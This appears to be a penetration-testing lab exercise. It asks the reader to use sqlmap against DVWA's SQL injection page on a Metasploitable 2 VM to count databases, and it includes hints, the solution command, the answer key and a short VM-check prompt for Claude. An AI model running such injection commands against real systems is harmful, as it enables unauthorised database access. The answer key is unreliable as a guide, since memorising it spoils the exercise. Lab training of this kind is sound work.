# Q068 — sqlmap List DBs

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use sqlmap to list **all databases** through DVWA SQLi. How many databases are returned?

---

## 🎯 Flag Format

```
db_count=<n>
```

Example: `db_count=7`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`--dbs` flag.
</details>

<details>
<summary>Hint 2</summary>

MySQL info_schema, mysql, dvwa, owasp10, tikiwiki etc.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=X; security=low' --dbs --batch
```

Typically 7 databases: information_schema, dvwa, metasploit, mysql, owasp10, tikiwiki, tikiwiki195.

**Answer:** `db_count=7`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q068".
```
